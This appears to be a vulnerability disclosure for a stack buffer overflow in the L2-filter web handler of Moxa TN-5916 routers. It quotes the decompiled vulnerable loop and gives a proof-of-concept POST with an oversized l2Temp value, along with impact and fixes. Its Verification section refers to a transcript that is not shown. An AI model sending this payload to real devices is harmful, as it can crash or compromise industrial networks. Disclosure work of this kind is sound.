# Moxa TN-5916 v3.2/v3.3 was discovered to contain a stack buffer overflow in the web L2-filter l2Temp handler

## Overview

- Vendor: Moxa
- Product: TN-5900-series / TN-5916 industrial security router
- Version: v3.2 and v3.3
- Component: magicP/WebServer/webs, L2-filter table handler
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 8.0 High `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (9.8 if the handler is reachable without a web session)
- Manufacturer: https://www.moxa.com/

## Affected versions

### v3.2 (2021-12)

- `moxa-tn-5900-series-firmware-v3.2.rom`.
- `magicP/WebServer/webs`.

### v3.3 (2022-10)

- `moxa-tn-5900-series-firmware-v3.3.rom`.
- `magicP/WebServer/webs`.

## Vulnerability details

`layer2_filter.asp` submits a `+`-separated table to:

```text
POST /goform/net_WebL2FilterGetValue
l2Temp=<field>+<field>+...+
```

`net_WebL2FilterGetValue` declares `char v21[32]` and parses each field
with:

```c
v10 = 0;
while (Var[v11] != '+')
    v21[v10++] = Var[v11++];
```

There is no `v10 < sizeof(v21)` check and no stop at the NUL
terminator. The outer loop runs `(plus_count - 1) / 8` times (capped at
512), so a payload with one long first field followed by at least 9 `+`
characters reaches the copy and overflows `v21` into adjacent locals,
saved arguments and the return path. The same unbounded loop is present
in v3.2 and v3.3.

The HTML page builds `l2Temp` with fixed-size table fields, but a direct
request bypasses the client-side limits.

## PoC

```http
POST /goform/net_WebL2FilterGetValue HTTP/1.1
Host: <router>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid web session>

l2Temp=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+++++++++++++++++
```

The first field (several hundred bytes) is copied into the 32-byte
`v21` stack buffer before the parser reaches the first `+`, overwriting
adjacent stack data and eventually the saved frame. The service may
crash or return through corrupted state.

## Verification

The vulnerable handler in the stock `magicP/WebServer/webs, L2-filter table handler` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

An authenticated web user can overwrite a 32-byte stack buffer with an
arbitrarily long field. At minimum this crashes the web server; with a
MIPS64 ROP chain it can execute code in the web server context. Moxa web
sessions are normally administrator-level.

## Remediation / known-CVE relation

- Bound every parsed field (`v10 < sizeof(v21) - 1`) and stop at the NUL
  terminator as well as at `+`.
- Reject `l2Temp` values whose field count or total length exceeds the
  documented table size.
- NVD keyword searches for `Moxa l2Temp`, `net_WebL2FilterGetValue` and
  `TN-5916 L2 filter` returned zero matching CVEs on 2026-11-08. This is
  a different handler from the `pingTemp`, SMTP and `iptTemp` reports.
  Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Moxa

### Product
TN-5900-series / TN-5916 industrial security router

### Version or Commit
v3.2 and v3.3

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_status
CVE application in progress

### Description
layer2_filter.asp submits a +-separated table as l2Temp; websGetVar returns it and the handler overflows fixed stack buffers.

### Affected_component
magicP/WebServer/webs, L2-filter table handler

### Attack_vector
Authenticated POST to the L2-filter /goform endpoint with an oversized l2Temp value.

### Product_version
TN-5900-series / TN-5916 industrial security router v3.2 and v3.3

### Reference
- https://www.moxa.com/
- https://github.com/vuln-1/vuln/blob/main/Moxa/TN-5916_V3.2/report-4.md
```
